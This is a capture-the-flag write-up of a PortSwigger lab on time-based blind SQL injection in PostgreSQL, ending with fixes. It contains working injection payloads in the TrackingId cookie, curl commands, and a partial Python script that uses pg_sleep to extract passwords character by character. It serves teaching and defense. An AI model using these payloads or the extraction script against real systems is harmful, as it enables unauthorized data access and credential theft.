---
title: "Blind SQL injection with time delays"
date: 2026-07-03 09:00:00 -0500
categories: [PortSwigger, SQL-injection]
tags: [portswigger, cwe-89, sql-injection, blind, time-based, postgresql, pg_sleep]
description: "A PortSwigger Web Security Academy lab where the app gives back nothing — no message, no data, no status change — so the only oracle left is how long the response takes. A single pg_sleep makes the database stall on command and proves the injection."
image:
    path: /assets/Images/PortSwigger-avatar.png
    alt: Blind SQL injection with time delays
---

## Overview

This [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays) lab is a [SQL injection](https://cwe.mitre.org/data/definitions/89.html) ([CWE-89](https://cwe.mitre.org/data/definitions/89.html)) on a **PostgreSQL** backend. The `TrackingId` cookie is concatenated into a query whose result is never displayed. Unlike the earlier blind labs, this app leaks **nothing** — no "Welcome back" message, no error, no status difference between a true and false condition. The only thing left to observe is **how long the response takes**.

> **Blind SQLi series.** The [conditional-responses]({% post_url 2026-06-30-Blind-SQL-injection-with-conditional-responses %}) lab leaked a 1-bit oracle through a visible message; [conditional-errors]({% post_url 2026-07-01-Blind-SQL-injection-with-conditional-errors %}) used an HTTP 500 toggle; [visible-error-based]({% post_url 2026-07-02-Visible-error-based-SQL-injection %}) read data straight from the error text. Here there is no message, no status flip, and no error text — so we fall back to the universal oracle: time.
{: .prompt-info }

## The technique

If the application gives back nothing useful, make the database **wait**. PostgreSQL's `pg_sleep(N)` pauses execution for N seconds; if you can make the response slow on demand, the injected SQL is running.

### Step 1 — baseline the response time

A normal request with the original tracking cookie returns almost instantly:

```bash
curl -sk -o /dev/null -w "time=%{time_total}s\n" \
  -b "TrackingId=qjtKUJ9GDa7JPvMa" \
  "https://<lab-id>.web-security-academy.net/"
# time=0.51s
```

### Step 2 — inject a delay

Close the string, concatenate a `pg_sleep`, and comment out the rest:

```
TrackingId=x'||pg_sleep(10)--
```

```bash
curl -sk -o /dev/null -w "time=%{time_total}s\n" \
  -b "TrackingId=x'||pg_sleep(10)--" \
  "https://<lab-id>.web-security-academy.net/"
# time=30.52s
```

The response hangs and the lab is marked **Solved** — triggering the delay is the whole objective here, no data extraction needed.

### Step 3 — prove you control it

To be sure the delay is *your* `pg_sleep` and not a fluke, vary the argument and watch the time track it:

```
TrackingId=x'||pg_sleep(5)--   ->  15.57s
TrackingId=x'||pg_sleep(10)--  ->  30.52s
```

The delay scales linearly with the argument — definitive proof of a time-based oracle.

> **The ~3x multiplier gotcha.** `pg_sleep(10)` produced ~30s, not 10s, because the same `TrackingId` cookie is used in roughly **three** separate queries per page load, so each `pg_sleep` runs three times. Don't expect the wall-clock delay to equal the exact number of seconds you asked for — judge "true" by a clear jump over baseline, not an exact N.
{: .prompt-warning }

## From confirmation to data extraction

This lab only asks you to trigger the delay, but the same oracle extracts data when you need it. Wrap the sleep in a condition so the database only pauses when a guess is correct, then binary-search the password one character at a time:

```python
import requests
base = "https://<lab-id>.web-security-academy.net/"
D = 5  # seconds = TRUE
def truth(cond):
    p = f"' AND (SELECT CASE WHEN ({cond}) THEN pg_sleep({D}) ELSE pg_sleep(0) END)--"
    r = requests.get(base, cookies={"TrackingId": "x" + p}, verify=False)
    return r.elapsed.total_seconds() > D - 0.5
# binary-search LENGTH(password), then ASCII(SUBSTRING(password,i,1)) per char
```

A slow response means the condition held. About seven requests recover each character versus ~95 for a naive brute force.

## Why it works

Time-based blind injection is the lowest-common-denominator oracle: it needs no reflected output, no conditional message, and no error channel — just the ability to influence and measure response time. That makes it the fallback whenever the more informative oracles (visible data, conditional response, error text) are all closed off. The cost is speed: every bit of information takes a full sleep interval, so extraction is slow, but it is reliable on almost any injectable point including unreflected cookies and headers.

## The fix

- **Parameterized queries / prepared statements.** Bind the cookie as data so it can never become part of the SQL — this closes the injection itself, which is the only real fix.
- **Least privilege.** Scope the database account so a successful injection reaches as little as possible.
- **Statement timeouts and monitoring.** A query that sleeps for tens of seconds on a request that should take milliseconds is an anomaly worth alerting on, even though it is a detection aid rather than a fix.
